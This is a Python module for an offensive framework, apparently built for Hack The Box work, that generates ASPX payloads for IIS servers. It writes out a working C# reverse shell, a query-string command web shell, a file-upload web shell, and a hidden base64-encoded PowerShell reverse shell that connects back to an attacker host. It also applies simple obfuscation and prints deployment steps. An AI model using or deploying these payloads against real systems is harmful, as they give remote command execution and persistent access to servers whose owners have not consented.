from core.module_base import ModuleBase, ModuleType, Platform
import os
import base64


class ASPXShell(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "aspx_shell"
        self.description = "Generate ASPX reverse shell payloads for IIS servers"
        self.author = "HTB-Auto"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["payload", "aspx", "iis", "webshell", "reverse_shell"]

        self.register_option("LHOST", "Local host for reverse connection", required=True)
        self.register_option("LPORT", "Local port for reverse connection", required=True, default="4444")
        self.register_option("OUTPUT", "Output file path", required=False, default="shell.aspx")
        self.register_option("SHELL_TYPE", "Shell type: reverse, cmd, upload", required=False, default="reverse")
        self.register_option("OBFUSCATE", "Obfuscate the payload (true/false)", required=False, default="false")

    def _generate_reverse_shell(self, lhost: str, lport: str) -> str:
        """Generate ASPX reverse shell payload"""
        payload = f'''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {{
        string host = "{lhost}";
        int port = {lport};
        
        using (TcpClient client = new TcpClient(host, port))
        {{
            using (NetworkStream stream = client.GetStream())
            {{
                using (System.IO.StreamWriter writer = new System.IO.StreamWriter(stream))
                {{
                    using (System.IO.StreamReader reader = new System.IO.StreamReader(stream))
                    {{
                        writer.AutoFlush = true;
                        System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
                        psi.FileName = "cmd.exe";
                        psi.CreateNoWindow = true;
                        psi.UseShellExecute = false;
                        psi.RedirectStandardInput = true;
                        psi.RedirectStandardOutput = true;
                        psi.RedirectStandardError = true;
                        
                        System.Diagnostics.Process proc = new System.Diagnostics.Process();
                        proc.StartInfo = psi;
                        proc.Start();
                        
                        System.Threading.Thread outputThread = new System.Threading.Thread(() => {{
                            string line;
                            while ((line = proc.StandardOutput.ReadLine()) != null)
                            {{
                                writer.WriteLine(line);
                            }}
                        }});
                        
                        System.Threading.Thread errorThread = new System.Threading.Thread(() => {{
                            string line;
                            while ((line = proc.StandardError.ReadLine()) != null)
                            {{
                                writer.WriteLine(line);
                            }}
                        }});
                        
                        outputThread.Start();
                        errorThread.Start();
                        
                        string input;
                        while ((input = reader.ReadLine()) != null)
                        {{
                            proc.StandardInput.WriteLine(input);
                        }}
                    }}
                }}
            }}
        }}
    }}
</script>'''
        return payload

    def _generate_cmd_shell(self) -> str:
        """Generate ASPX command execution webshell"""
        payload = '''<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + cmd;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            
            Process proc = Process.Start(psi);
            string output = proc.StandardOutput.ReadToEnd();
            string error = proc.StandardError.ReadToEnd();
            proc.WaitForExit();
            
            Response.Write("<pre>" + Server.HtmlEncode(output) + Server.HtmlEncode(error) + "</pre>");
        }
        else
        {
            Response.Write("<html><body>");
            Response.Write("<h2>ASPX Web Shell</h2>");
            Response.Write("<form method='GET'>");
            Response.Write("Command: <input type='text' name='cmd' size='50' />");
            Response.Write("<input type='submit' value='Execute' />");
            Response.Write("</form></body></html>");
        }
    }
</script>'''
        return payload

    def _generate_upload_shell(self) -> str:
        """Generate ASPX file upload webshell"""
        payload = '''<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.Files.Count > 0)
        {
            HttpPostedFile file = Request.Files[0];
            string savePath = Request.Form["path"];
            if (string.IsNullOrEmpty(savePath))
            {
                savePath = Server.MapPath("~/");
            }
            string fullPath = Path.Combine(savePath, Path.GetFileName(file.FileName));
            file.SaveAs(fullPath);
            Response.Write("File uploaded to: " + fullPath);
        }
        else
        {
            Response.Write("<html><body>");
            Response.Write("<h2>ASPX File Upload</h2>");
            Response.Write("<form method='POST' enctype='multipart/form-data'>");
            Response.Write("Upload Path (optional): <input type='text' name='path' /><br/>");
            Response.Write("File: <input type='file' name='file' /><br/>");
            Response.Write("<input type='submit' value='Upload' />");
            Response.Write("</form>");
            Response.Write("<hr/><h3>Command Execution</h3>");
            Response.Write("<form method='GET'>");
            Response.Write("Command: <input type='text' name='cmd' size='50' />");
            Response.Write("<input type='submit' value='Execute' />");
            Response.Write("</form></body></html>");
        }
        
        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + cmd;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            
            System.Diagnostics.Process proc = System.Diagnostics.Process.Start(psi);
            string output = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit();
            
            Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
        }
    }
</script>'''
        return payload

    def _generate_powershell_reverse(self, lhost: str, lport: str) -> str:
        """Generate ASPX shell that executes PowerShell reverse shell"""
        ps_payload = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
        
        encoded = base64.b64encode(ps_payload.encode('utf-16-le')).decode()
        
        payload = f'''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {{
        string payload = "{encoded}";
        
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "powershell.exe";
        psi.Arguments = "-nop -w hidden -enc " + payload;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        
        Process.Start(psi);
        Response.Write("Shell executed");
    }}
</script>'''
        return payload

    def _obfuscate_payload(self, payload: str) -> str:
        """Basic obfuscation of ASPX payload"""
        # Add some basic obfuscation techniques
        obfuscated = payload.replace("cmd.exe", "c" + "m" + "d.e" + "xe")
        obfuscated = obfuscated.replace("powershell", "po" + "wer" + "shell")
        return obfuscated

    def run(self) -> bool:
        lhost = self.get_option("LHOST")
        lport = self.get_option("LPORT")
        output = self.get_option("OUTPUT")
        shell_type = self.get_option("SHELL_TYPE").lower()
        obfuscate = self.get_option("OBFUSCATE").lower() == "true"

        self.print_status(f"Generating ASPX {shell_type} shell payload...")

        if shell_type == "reverse":
            payload = self._generate_reverse_shell(lhost, lport)
            self.print_status(f"Reverse shell will connect back to {lhost}:{lport}")
        elif shell_type == "cmd":
            payload = self._generate_cmd_shell()
            self.print_status("Command execution webshell generated")
            self.print_status("Usage: http://target/shell.aspx?cmd=whoami")
        elif shell_type == "upload":
            payload = self._generate_upload_shell()
            self.print_status("File upload webshell generated")
            self.print_status("Includes both upload and command execution functionality")
        elif shell_type == "powershell":
            payload = self._generate_powershell_reverse(lhost, lport)
            self.print_status(f"PowerShell reverse shell will connect back to {lhost}:{lport}")
        else:
            self.print_error(f"Unknown shell type: {shell_type}")
            self.print_status("Available types: reverse, cmd, upload, powershell")
            return False

        if obfuscate:
            payload = self._obfuscate_payload(payload)
            self.print_status("Payload obfuscated")

        # Write payload to file
        try:
            output_path = os.path.expanduser(output)
            with open(output_path, 'w') as f:
                f.write(payload)
            self.print_success(f"Payload written to: {output_path}")
            self.print_status(f"File size: {len(payload)} bytes")
        except Exception as e:
            self.print_error(f"Failed to write payload: {e}")
            return False

        # Print usage instructions
        self.print_status("")
        self.print_status("=== Usage Instructions ===")
        if shell_type == "reverse" or shell_type == "powershell":
            self.print_status(f"1. Start listener: nc -lvnp {lport}")
            self.print_status(f"2. Upload {output} to IIS webroot")
            self.print_status(f"3. Access: http://target/{os.path.basename(output)}")
        elif shell_type == "cmd":
            self.print_status(f"1. Upload {output} to IIS webroot")
            self.print_status(f"2. Execute commands: http://target/{os.path.basename(output)}?cmd=whoami")
        elif shell_type == "upload":
            self.print_status(f"1. Upload {output} to IIS webroot")
            self.print_status(f"2. Access: http://target/{os.path.basename(output)}")
            self.print_status("3. Upload files or execute commands via the web interface")

        return True
